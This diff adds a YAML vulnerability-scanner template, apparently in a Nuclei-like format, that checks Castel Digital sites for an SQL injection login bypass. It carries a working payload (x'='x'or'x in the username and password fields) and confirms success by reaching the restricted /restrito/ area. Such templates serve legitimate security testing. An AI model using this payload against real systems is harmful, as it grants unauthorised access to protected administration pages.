@@ -1,0 +1,41 @@
+id: castel-digital-sqli
+brief:
+    title: Castel Digital - Authentication Bypass
+    by: s4e-io
+    level: high
+    about: SQL Injection vulnerability in Castel Digital login forms.
+    label:
+        - sqli
+        - auth-bypass
+        - castel
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/restrito/login/sub/'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: username=x%27%3D%27x%27or%27x&password=x%27%3D%27x%27or%27x
+      signs:
+        - "on": word
+          has:
+            - Banner
+            - Construtoras
+          in: body_2
+          need: all
+        - "on": status
+          status:
+            - 200
+    - verb: GET
+      to:
+        - '{{BaseURL}}/restrito/'
+      signs:
+        - "on": word
+          has:
+            - Banner
+            - Construtoras
+          in: body_2
+          need: all
+        - "on": status
+          status:
+            - 200
